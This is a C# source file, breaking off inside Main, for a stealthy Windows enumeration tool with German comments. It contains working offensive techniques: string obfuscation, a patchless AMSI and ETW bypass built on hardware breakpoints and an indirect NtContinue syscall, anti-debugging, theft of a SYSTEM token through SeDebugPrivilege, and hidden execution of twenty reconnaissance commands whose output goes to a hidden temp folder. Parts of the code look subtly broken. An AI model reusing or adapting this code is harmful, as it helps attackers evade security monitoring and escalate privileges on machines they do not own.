using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.ComponentModel;
using System.IO;
using System.Text;
using System.Threading;
using Microsoft.Win32.SafeHandles;
using System.Security.Cryptography;
using System.Linq;

namespace StealthSystemEnumerator
{
    #region String Obfuscation (XOR + Base64)
    public static class StringObfuscator
    {
        private static readonly byte[] _xorKey = GenerateXorKey();
        
        private static byte[] GenerateXorKey()
        {
            string seed = Environment.MachineName.Length.ToString() + 
                         Environment.ProcessorCount.ToString() +
                         DateTime.Now.DayOfYear.ToString();
            byte[] key = new byte[8];
            for (int i = 0; i < 8; i++)
                key[i] = (byte)(seed[i % seed.Length] ^ 0xAA);
            return key;
        }
        
        public static string Obfuscate(string input)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(input);
            for (int i = 0; i < bytes.Length; i++)
                bytes[i] ^= _xorKey[i % _xorKey.Length];
            return Convert.ToBase64String(bytes);
        }
        
        public static string Deobfuscate(string input)
        {
            byte[] bytes = Convert.FromBase64String(input);
            for (int i = 0; i < bytes.Length; i++)
                bytes[i] ^= _xorKey[i % _xorKey.Length];
            return Encoding.UTF8.GetString(bytes);
        }
    }
    
    public static class ObfuscatedStrings
    {
        // API-Namen
        public static readonly string NtContinue = StringObfuscator.Obfuscate("NtContinue");
        public static readonly string NtCreateFile = StringObfuscator.Obfuscate("NtCreateFile");
        public static readonly string NtTraceEvent = StringObfuscator.Obfuscate("NtTraceEvent");
        public static readonly string AmsiScanBuffer = StringObfuscator.Obfuscate("AmsiScanBuffer");
        public static readonly string EtwEventWrite = StringObfuscator.Obfuscate("EtwEventWrite");
        public static readonly string SeDebugPrivilege = StringObfuscator.Obfuscate("SeDebugPrivilege");
        
        // DLL-Namen
        public static readonly string Ntdll = StringObfuscator.Obfuscate("ntdll.dll");
        public static readonly string Amsi = StringObfuscator.Obfuscate("amsi.dll");
        public static readonly string Kernel32 = StringObfuscator.Obfuscate("kernel32.dll");
        public static readonly string Advapi32 = StringObfuscator.Obfuscate("advapi32.dll");
        
        // Prozessnamen
        public static readonly string CmdExe = StringObfuscator.Obfuscate("cmd.exe");
        
        // Befehle - Die 20 besten
        public static readonly string[] EncryptedCommands = new string[]
        {
            StringObfuscator.Obfuscate("systeminfo"),
            StringObfuscator.Obfuscate("hostname"),
            StringObfuscator.Obfuscate("whoami"),
            StringObfuscator.Obfuscate("whoami /priv"),
            StringObfuscator.Obfuscate("whoami /groups"),
            StringObfuscator.Obfuscate("ipconfig /all"),
            StringObfuscator.Obfuscate("netstat -an"),
            StringObfuscator.Obfuscate("netstat -ano"),
            StringObfuscator.Obfuscate("route print"),
            StringObfuscator.Obfuscate("arp -a"),
            StringObfuscator.Obfuscate("net user"),
            StringObfuscator.Obfuscate("net localgroup"),
            StringObfuscator.Obfuscate("net group /domain"),
            StringObfuscator.Obfuscate("net accounts"),
            StringObfuscator.Obfuscate("tasklist"),
            StringObfuscator.Obfuscate("tasklist /svc"),
            StringObfuscator.Obfuscate("sc query state= all"),
            StringObfuscator.Obfuscate("wmic service list brief"),
            StringObfuscator.Obfuscate("auditpol /get /category:*"),
            StringObfuscator.Obfuscate("wmic qfe list brief /format:table")
        };
        
        // Befehlsnamen für Dateien
        public static readonly string[] EncryptedCommandNames = new string[]
        {
            StringObfuscator.Obfuscate("01_Systeminfo"),
            StringObfuscator.Obfuscate("02_Hostname"),
            StringObfuscator.Obfuscate("03_Whoami"),
            StringObfuscator.Obfuscate("04_Privileges"),
            StringObfuscator.Obfuscate("05_Groups"),
            StringObfuscator.Obfuscate("06_IPConfig"),
            StringObfuscator.Obfuscate("07_Netstat_All"),
            StringObfuscator.Obfuscate("08_Netstat_PIDs"),
            StringObfuscator.Obfuscate("09_Route_Table"),
            StringObfuscator.Obfuscate("10_ARP_Table"),
            StringObfuscator.Obfuscate("11_Local_Users"),
            StringObfuscator.Obfuscate("12_Local_Groups"),
            StringObfuscator.Obfuscate("13_Domain_Groups"),
            StringObfuscator.Obfuscate("14_Account_Policies"),
            StringObfuscator.Obfuscate("15_Processes"),
            StringObfuscator.Obfuscate("16_Processes_Services"),
            StringObfuscator.Obfuscate("17_Services"),
            StringObfuscator.Obfuscate("18_Services_WMIC"),
            StringObfuscator.Obfuscate("19_Audit_Policies"),
            StringObfuscator.Obfuscate("20_Hotfixes")
        };
        
        // Summary-Texte
        public static readonly string SummaryHeader = StringObfuscator.Obfuscate("=== SYSTEM ENUMERATION REPORT ===");
        public static readonly string SummaryComputer = StringObfuscator.Obfuscate("Computer:");
        public static readonly string SummaryUser = StringObfuscator.Obfuscate("User:");
        public static readonly string SummaryOS = StringObfuscator.Obfuscate("OS:");
        public static readonly string SummaryTime = StringObfuscator.Obfuscate("Time:");
        public static readonly string SummaryOutputDir = StringObfuscator.Obfuscate("Output Directory:");
        public static readonly string SummaryExecuting = StringObfuscator.Obfuscate("Executing:");
        public static readonly string SummaryOutput = StringObfuscator.Obfuscate("Output:");
        public static readonly string SummaryPreview = StringObfuscator.Obfuscate("Preview:");
        public static readonly string SummaryError = StringObfuscator.Obfuscate("ERROR:");
        public static readonly string SummaryComplete = StringObfuscator.Obfuscate("Enumeration completed:");
        public static readonly string SummaryTotalFiles = StringObfuscator.Obfuscate("Total files:");
        
        public static readonly string ErrorPrefix = StringObfuscator.Obfuscate("[ERROR]");
        public static readonly string CmdPrefix = StringObfuscator.Obfuscate("/c ");
    }
    #endregion

    #region Native Structures
    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT
    {
        public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
        public uint ContextFlags, MxCsr;
        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
        public uint EFlags;
        public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
        public ulong R8, R9, R10, R11, R12, R13, R14, R15, Rip;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct EXCEPTION_RECORD
    {
        public uint ExceptionCode, ExceptionFlags;
        public IntPtr ExceptionRecord, ExceptionAddress;
        public uint NumberParameters;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15)]
        public ulong[] ExceptionInformation;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct EXCEPTION_POINTERS
    {
        public IntPtr ExceptionRecord, ContextRecord;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess, hThread;
        public int dwProcessId, dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public string lpReserved, lpDesktop, lpTitle;
        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public SafeFileHandle hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }
    #endregion

    #region Native Constants
    public static class Consts
    {
        public const uint CONTEXT_DEBUG_REGISTERS = 0x10010;
        public const uint STATUS_SINGLE_STEP = 0x80000004;
        public const uint EXCEPTION_CONTINUE_EXECUTION = 0xFFFFFFFF;
        public const uint EXCEPTION_CONTINUE_SEARCH = 0x0;
        public const uint CREATE_NO_WINDOW = 0x08000000;
        public const uint TOKEN_DUPLICATE = 0x0002;
        public const uint TOKEN_IMPERSONATE = 0x0004;
        public const uint TOKEN_QUERY = 0x0008;
        public const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        public const uint TOKEN_ALL_ACCESS = 0xF01FF;
        public const int TokenPrimary = 1;
        public const int SecurityDelegation = 3;
        public const uint SE_PRIVILEGE_ENABLED = 0x2;
        public const short SW_HIDE = 0;
        public const uint STARTF_USESTDHANDLES = 0x00000100;
        public const uint STARTF_USESHOWWINDOW = 0x00000001;
        public const int BUFFER_SIZE = 65536;
        public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        public const uint MEM_COMMIT = 0x1000;
        public const uint PAGE_EXECUTE_READWRITE = 0x40;
    }
    #endregion

    #region Native Imports
    public class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr AddVectoredExceptionHandler(uint FirstHandler, IntPtr Handler);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool RemoveVectoredExceptionHandler(IntPtr Handler);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LoadLibrary(string lpLibFileName);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CreatePipe(out SafeFileHandle hReadPipe, out SafeFileHandle hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadFile(SafeFileHandle hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentThread();
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool IsDebuggerPresent();
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool ShowWindow(IntPtr hWnd, short nCmdShow);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
    }
    #endregion

    #region Stealth Techniken
    public class Stealth
    {
        private static Random jitter = new Random();
        
        public static bool IsDebugged()
        {
            return NativeMethods.IsDebuggerPresent();
        }
        
        public static void HideWindow()
        {
            var handle = NativeMethods.GetConsoleWindow();
            if (handle != IntPtr.Zero)
                NativeMethods.ShowWindow(handle, Consts.SW_HIDE);
        }
        
        public static void JitterSleep(int baseMs)
        {
            int variation = jitter.Next(-baseMs / 4, baseMs / 4);
            Thread.Sleep(Math.Max(10, baseMs + variation));
        }
    }
    #endregion

    #region HELLSHALL + NTCONTINUE - PATCHLESS AMSI/ETW BYPASS
    public class PatchlessBypass
    {
        // HellsHall Syscall Info Struktur
        [StructLayout(LayoutKind.Sequential)]
        private struct SYSCALL_INFO
        {
            public uint SSN;
            public IntPtr SyscallInstruction;
            public IntPtr FunctionAddress;
        }

        private static SYSCALL_INFO ntcontinueInfo;
        private static IntPtr vehHandle;
        private static IntPtr amsiAddr;
        private static IntPtr etwAddr;
        
        // HellsHall: Findet die syscall-Instruction (0x0F 0x05) in einer Funktion
        private static unsafe IntPtr FindSyscallInstruction(IntPtr functionAddress)
        {
            byte* addr = (byte*)functionAddress.ToPointer();
            for (int i = 0; i < 32; i++)
            {
                if (addr[i] == 0x0F && addr[i + 1] == 0x05)
                    return new IntPtr(addr + i);
            }
            return IntPtr.Zero;
        }
        
        // HellsGate: Extrahiert die Syscall-Nummer aus einer ntdll-Funktion
        private static unsafe uint GetSyscallNumber(IntPtr functionAddress)
        {
            byte* addr = (byte*)functionAddress.ToPointer();
            // Pattern: 4C 8B D1 (mov r10, rcx) + B8 XX XX 00 00 (mov eax, SSN)
            if (addr[0] == 0x4C && addr[1] == 0x8B && addr[2] == 0xD1 && addr[3] == 0xB8)
            {
                return *(uint*)(addr + 4);
            }
            return 0;
        }
        
        // HellsHall: Löst NtContinue auf (findet SSN + syscall-Instruction in ntdll)
        private static SYSCALL_INFO ResolveNtContinue()
        {
            SYSCALL_INFO info = new SYSCALL_INFO();
            string ntdllName = StringObfuscator.Deobfuscate(ObfuscatedStrings.Ntdll);
            string ntContinueName = StringObfuscator.Deobfuscate(ObfuscatedStrings.NtContinue);
            
            IntPtr ntdll = NativeMethods.GetModuleHandle(ntdllName);
            if (ntdll == IntPtr.Zero)
                ntdll = NativeMethods.LoadLibrary(ntdllName);
            
            info.FunctionAddress = NativeMethods.GetProcAddress(ntdll, ntContinueName);
            if (info.FunctionAddress == IntPtr.Zero)
                return info;
            
            info.SSN = GetSyscallNumber(info.FunctionAddress);
            info.SyscallInstruction = FindSyscallInstruction(info.FunctionAddress);
            
            // BouncyGate Fallback: Wenn keine syscall-Instruction in NtContinue, aus anderer Funktion
            if (info.SyscallInstruction == IntPtr.Zero)
            {
                string ntCreateName = StringObfuscator.Deobfuscate(ObfuscatedStrings.NtCreateFile);
                IntPtr otherFunc = NativeMethods.GetProcAddress(ntdll, ntCreateName);
                info.SyscallInstruction = FindSyscallInstruction(otherFunc);
            }
            
            return info;
        }
        
        // Indirekter Syscall Stub (HellsHall) - JMP zur syscall-Instruction INNERHALB von ntdll
        private static unsafe int InvokeNtContinue(ref CONTEXT context, int testAlert)
        {
            // Erstelle ausführbaren Stub für den indirekten Syscall
            byte[] stubCode = new byte[]
            {
                0x4C, 0x8B, 0xD1,                    // mov r10, rcx
                0xB8,                                 // mov eax,
                (byte)(ntcontinueInfo.SSN & 0xFF),
                (byte)((ntcontinueInfo.SSN >> 8) & 0xFF),
                (byte)((ntcontinueInfo.SSN >> 16) & 0xFF),
                (byte)((ntcontinueInfo.SSN >> 24) & 0xFF),
                0x48, 0xB8,                          // mov rax,
                (byte)((ulong)ntcontinueInfo.SyscallInstruction & 0xFF),
                (byte)(((ulong)ntcontinueInfo.SyscallInstruction >> 8) & 0xFF),
                (byte)(((ulong)ntcontinueInfo.SyscallInstruction >> 16) & 0xFF),
                (byte)(((ulong)ntcontinueInfo.SyscallInstruction >> 24) & 0xFF),
                (byte)(((ulong)ntcontinueInfo.SyscallInstruction >> 32) & 0xFF),
                (byte)(((ulong)ntcontinueInfo.SyscallInstruction >> 40) & 0xFF),
                (byte)(((ulong)ntcontinueInfo.SyscallInstruction >> 48) & 0xFF),
                (byte)(((ulong)ntcontinueInfo.SyscallInstruction >> 56) & 0xFF),
                0xFF, 0xE0,                          // jmp rax (springe zu syscall in ntdll)
                0xC3                                 // ret
            };
            
            IntPtr stubMemory = NativeMethods.VirtualAlloc(IntPtr.Zero, (uint)stubCode.Length, Consts.MEM_COMMIT, Consts.PAGE_EXECUTE_READWRITE);
            if (stubMemory == IntPtr.Zero)
            {
                // Fallback: direkter P/Invoke (nicht optimal, aber funktioniert)
                return NtContinueDirect(ref context, testAlert);
            }
            
            Marshal.Copy(stubCode, 0, stubMemory, stubCode.Length);
            
            // Delegaten für den Stub
            delegate* unmanaged<ref CONTEXT, int, int> stubDelegate = (delegate* unmanaged<ref CONTEXT, int, int>)stubMemory;
            int result = stubDelegate(ref context, testAlert);
            
            NativeMethods.VirtualAlloc(stubMemory, 0, Consts.MEM_COMMIT, Consts.PAGE_EXECUTE_READWRITE); // Free
            return result;
        }
        
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtContinueDirect(ref CONTEXT Context, int TestAlert);
        
        public static bool Initialize()
        {
            if (Stealth.IsDebugged()) return false;
            
            ntcontinueInfo = ResolveNtContinue();
            if (ntcontinueInfo.SSN == 0 || ntcontinueInfo.SyscallInstruction == IntPtr.Zero)
                return false;
            
            RegisterExceptionHandler();
            SetHardwareBreakpoints();
            return true;
        }
        
        private static void SetHardwareBreakpoints()
        {
            string amsiName = StringObfuscator.Deobfuscate(ObfuscatedStrings.Amsi);
            string amsiFunc = StringObfuscator.Deobfuscate(ObfuscatedStrings.AmsiScanBuffer);
            string etwFunc = StringObfuscator.Deobfuscate(ObfuscatedStrings.EtwEventWrite);
            
            IntPtr amsi = NativeMethods.LoadLibrary(amsiName);
            amsiAddr = NativeMethods.GetProcAddress(amsi, amsiFunc);
            
            string ntdllName = StringObfuscator.Deobfuscate(ObfuscatedStrings.Ntdll);
            IntPtr ntdll = NativeMethods.GetModuleHandle(ntdllName);
            etwAddr = NativeMethods.GetProcAddress(ntdll, etwFunc);
            
            CONTEXT ctx = new CONTEXT();
            ctx.ContextFlags = Consts.CONTEXT_DEBUG_REGISTERS;
            
            if (amsiAddr != IntPtr.Zero)
                ctx.Dr0 = (ulong)amsiAddr;
            if (etwAddr != IntPtr.Zero)
                ctx.Dr1 = (ulong)etwAddr;
            
            // DR7: Lokales Enable für DR0 (Bit 0) und DR1 (Bit 2)
            ctx.Dr7 = (amsiAddr != IntPtr.Zero ? 0x1 : 0) | (etwAddr != IntPtr.Zero ? 0x4 : 0);
            
            // HellsHall: Indirekter Syscall zu NtContinue
            InvokeNtContinue(ref ctx, 0);
        }
        
        private static void RegisterExceptionHandler()
        {
            var del = new VectoredExceptionDelegate(Handler);
            IntPtr ptr = Marshal.GetFunctionPointerForDelegate(del);
            vehHandle = NativeMethods.AddVectoredExceptionHandler(1, ptr);
            GC.KeepAlive(del);
        }
        
        private delegate uint VectoredExceptionDelegate(IntPtr exceptionPointers);
        
        private static uint Handler(IntPtr exceptionPointers)
        {
            EXCEPTION_POINTERS ep = Marshal.PtrToStructure<EXCEPTION_POINTERS>(exceptionPointers);
            EXCEPTION_RECORD er = Marshal.PtrToStructure<EXCEPTION_RECORD>(ep.ExceptionRecord);
            
            if (er.ExceptionCode == Consts.STATUS_SINGLE_STEP)
            {
                CONTEXT ctx = Marshal.PtrToStructure<CONTEXT>(ep.ContextRecord);
                
                if ((amsiAddr != IntPtr.Zero && ctx.Rip == (ulong)amsiAddr) ||
                    (etwAddr != IntPtr.Zero && ctx.Rip == (ulong)etwAddr))
                {
                    // AMSI/ETW umgehen: RAX auf S_OK (0) setzen
                    ctx.Rax = 0x00000000;
                    ctx.Rip = FindRetGadget(ctx.Rip);
                    ctx.EFlags |= (1 << 16); // Resume Flag
                    Marshal.StructureToPtr(ctx, ep.ContextRecord, false);
                    return Consts.EXCEPTION_CONTINUE_EXECUTION;
                }
            }
            return Consts.EXCEPTION_CONTINUE_SEARCH;
        }
        
        private static unsafe ulong FindRetGadget(ulong nearAddress)
        {
            byte* addr = (byte*)nearAddress;
            for (int i = 0; i < 0x10000; i++)
            {
                if (addr[i] == 0xC3) // RET Instruction
                    return nearAddress + (ulong)i;
            }
            return nearAddress + 5;
        }
        
        public static void Cleanup()
        {
            if (vehHandle != IntPtr.Zero)
                NativeMethods.RemoveVectoredExceptionHandler(vehHandle);
            
            CONTEXT ctx = new CONTEXT();
            ctx.ContextFlags = Consts.CONTEXT_DEBUG_REGISTERS;
            ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = ctx.Dr7 = 0;
            InvokeNtContinue(ref ctx, 0);
        }
    }
    #endregion

    #region Token Manager
    public class TokenManager
    {
        public static IntPtr StealSystemToken()
        {
            EnableDebugPrivilege();
            
            int[] pids = { 4, 444, 668, 896, 1024, 1232 };
            
            foreach (int pid in pids)
            {
                IntPtr process = NativeMethods.OpenProcess(Consts.PROCESS_ALL_ACCESS, false, pid);
                if (process != IntPtr.Zero)
                {
                    if (NativeMethods.OpenProcessToken(process, Consts.TOKEN_DUPLICATE | Consts.TOKEN_QUERY | Consts.TOKEN_IMPERSONATE, out IntPtr token))
                    {
                        SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
                        sa.nLength = Marshal.SizeOf(sa);
                        
                        if (NativeMethods.DuplicateTokenEx(token, Consts.TOKEN_ALL_ACCESS, ref sa, Consts.SecurityDelegation, Consts.TokenPrimary, out IntPtr newToken))
                        {
                            NativeMethods.CloseHandle(token);
                            NativeMethods.CloseHandle(process);
                            return newToken;
                        }
                        NativeMethods.CloseHandle(token);
                    }
                    NativeMethods.CloseHandle(process);
                }
                Stealth.JitterSleep(50);
            }
            return IntPtr.Zero;
        }
        
        private static void EnableDebugPrivilege()
        {
            string seDebug = StringObfuscator.Deobfuscate(ObfuscatedStrings.SeDebugPrivilege);
            
            if (!NativeMethods.OpenProcessToken(NativeMethods.GetCurrentProcess(), Consts.TOKEN_ALL_ACCESS, out IntPtr token)) return;
            
            NativeMethods.LookupPrivilegeValue(null, seDebug, out LUID luid);
            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
            tp.PrivilegeCount = 1;
            tp.Privileges.Luid = luid;
            tp.Privileges.Attributes = Consts.SE_PRIVILEGE_ENABLED;
            NativeMethods.AdjustTokenPrivileges(token, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            NativeMethods.CloseHandle(token);
        }
    }
    #endregion

    #region Command Executor
    public class CommandExecutor
    {
        public static string Execute(string command, IntPtr token = default)
        {
            using (var stdoutPipe = new AnonymousPipeServerStream(PipeDirection.Out, HandleInheritability.Inheritable))
            using (var stderrPipe = new AnonymousPipeServerStream(PipeDirection.Out, HandleInheritability.Inheritable))
            {
                STARTUPINFOEX si = new STARTUPINFOEX();
                si.StartupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFO));
                si.StartupInfo.dwFlags = Consts.STARTF_USESTDHANDLES | Consts.STARTF_USESHOWWINDOW;
                si.StartupInfo.wShowWindow = Consts.SW_HIDE;
                si.StartupInfo.hStdOutput = new SafeFileHandle(stdoutPipe.ClientSafePipeHandle.DangerousGetHandle(), false);
                si.StartupInfo.hStdError = new SafeFileHandle(stderrPipe.ClientSafePipeHandle.DangerousGetHandle(), false);
                si.StartupInfo.hStdInput = new SafeFileHandle(NativeMethods.GetCurrentProcess(), false);
                
                stdoutPipe.ClientSafePipeHandle.Close();
                stderrPipe.ClientSafePipeHandle.Close();
                
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                string cmdPrefix = StringObfuscator.Deobfuscate(ObfuscatedStrings.CmdPrefix);
                string cmdLine = cmdPrefix + command;
                string cmdExe = StringObfuscator.Deobfuscate(ObfuscatedStrings.CmdExe);
                uint flags = Consts.CREATE_NO_WINDOW;
                
                SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
                sa.nLength = Marshal.SizeOf(sa);
                sa.bInheritHandle = true;
                
                bool success;
                if (token != IntPtr.Zero)
                    success = NativeMethods.CreateProcessAsUser(token, cmdExe, cmdLine, ref sa, ref sa, true, flags, IntPtr.Zero, null, ref si, out pi);
                else
                    success = NativeMethods.CreateProcess(cmdExe, cmdLine, ref sa, ref sa, true, flags, IntPtr.Zero, null, ref si, out pi);
                
                if (!success)
                {
                    string errorPrefix = StringObfuscator.Deobfuscate(ObfuscatedStrings.ErrorPrefix);
                    return $"{errorPrefix} {new Win32Exception(Marshal.GetLastWin32Error()).Message}";
                }
                
                pi.hThread.Close();
                
                StringBuilder output = new StringBuilder();
                
                using (var stdoutReader = new StreamReader(stdoutPipe))
                using (var stderrReader = new StreamReader(stderrPipe))
                {
                    stdoutPipe.ReadTimeout = 30000;
                    stderrPipe.ReadTimeout = 30000;
                    try { output.Append(stdoutReader.ReadToEnd()); } catch { }
                    try { output.Append(stderrReader.ReadToEnd()); } catch { }
                }
                
                NativeMethods.WaitForSingleObject(pi.hProcess, 30000);
                pi.hProcess.Close();
                
                return output.ToString();
            }
        }
    }
    #endregion

    #region Hauptprogramm
    class Program
    {
        static void Main(string[] args)
        {
            // Fenster verstecken
            Stealth.HideWindow();
            
            // Anti-Debug
            if (Stealth.IsDebugged()) Environment.Exit(0);
            
            // Output Verzeichnis
            string outputDir = Path.Combine(Path.GetTempPath(), $"sys_{Environment.MachineName}_{DateTime.Now:yyyyMMdd_HHmmss}");
            Directory.CreateDirectory(outputDir);
            File.SetAttributes(outputDir, FileAttributes.Hidden);
            
            // HELLSHALL + NTCONTINUE Patchless Bypass initialisieren
            if (!PatchlessBypass.Initialize())
            {
                // Fallback: Trotzdem fortsetzen, aber ohne Bypass
            }
            
            // System-Token stehlen
            IntPtr systemToken = TokenManager.StealSystemToken();
            
            // Deobfuscierte Befehle
            string[] commands = new string[ObfuscatedStrings.EncryptedCommands.Length];
            string[] commandNames = new string[ObfuscatedStrings.EncryptedCommandNames.Length];
            
            for (int i = 0; i < ObfuscatedStrings.EncryptedCommands.Length; i++)
            {
                commands[i] = StringObfuscator.Deobfuscate(ObfuscatedStrings.EncryptedCommands[i]);
                commandNames[i] = StringObfuscator.Deobfuscate(ObfuscatedStrings.EncryptedCommandNames[i]);
            }
            
            // Deobfuscierte Texte
            string summaryHeader = StringObfuscator.Deobfuscate(ObfuscatedStrings.SummaryHeader);
            string summaryComputer = StringObfuscator.Deobfuscate(ObfuscatedStrings.SummaryComputer);
            string summaryUser = StringObfuscator.Deobfuscate(ObfuscatedStrings.SummaryUser);
            string summaryOS = StringObfuscator.Deobfuscate(ObfuscatedStrings.SummaryOS);
            string summaryTime = StringObfuscator.Deobfuscate(ObfuscatedStrings.SummaryTime);
            string summaryOutputDir = StringObfuscator.Deobfuscate(ObfuscatedStrings.SummaryOutputDir);
            string summaryExecuting = StringObfuscator.Deobfuscate(ObfuscatedStrings.SummaryExecuting);
            string summaryOutput = StringObfuscator.Deobfuscate(ObfuscatedStrings.SummaryOutput);
            string summaryPreview = StringObfuscator.Deobfuscate(ObfuscatedStrings.SummaryPreview);
            string summaryError = StringObfuscator.Deobfuscate(ObfuscatedStrings.SummaryError);
            string summaryComplete = StringObfuscator.Deobfuscate(ObfuscatedStrings.SummaryComplete);
            string summaryTotalFiles = StringObfuscator.Deobfuscate(ObfuscatedStrings.SummaryTotalFiles);
            string errorPrefix = StringObfuscator.Deobfuscate(ObfuscatedStrings.ErrorPrefix);
            
            // Summary Datei
            string summaryFile = Path.Combine(outputDir, "00_SUMMARY.txt");
            StringBuilder summary = new StringBuilder();
            summary.AppendLine(summaryHeader);
            summary.AppendLine($"{summaryComputer} {Environment.MachineName}");
            summary.AppendLine($"{summaryUser} {Environment.UserName}");
            summary.AppendLine($"{summaryOS} {Environment.OSVersion}");
            summary.AppendLine($"{summaryTime} {DateTime.Now}");
            summary.AppendLine($"{summaryOutputDir} {outputDir}");
            summary.AppendLine(new string('=', 80));
            summary.AppendLine();
            
            // Alle 20 Befehle ausführen
            for (int i = 0; i < commands.Length; i++)
            {
                string command = commands[i];
                string cmdName = commandNames[i];
                string outputFile = Path.Combine(outputDir, $"{cmdName}.txt");
                
                try
                {
                    summary.AppendLine($"[{DateTime.Now:HH:mm:ss}] {summaryExecuting} {command}");
                    
                    string result = CommandExecutor.Execute(command, systemToken);
                    File.WriteAllText(outputFile, result, Encoding.UTF8);
                    
                    int resultLen = result.Length;
                    string preview = result.Length > 200 ? result.Substring(0, 200) + "..." : result.Replace("\n", " ").Replace("\r", "");
                    summary.AppendLine($"  -> {summaryOutput} {resultLen} bytes");
                    summary.AppendLine($"  -> {summaryPreview} {preview}");
                    summary.AppendLine();
                }
                catch (Exception ex)
                {
                    File.WriteAllText(outputFile, $"{errorPrefix} {ex.Message}");
                    summary.AppendLine($"  -> {summaryError} {ex.Message}");
                    summary.AppendLine();
                }
                
                Stealth.JitterSleep(500);
            }
            
            // Summary abschließen
            summary.AppendLine(new string('=', 80));
            summary.AppendLine($"{summaryComplete} {DateTime.Now}");
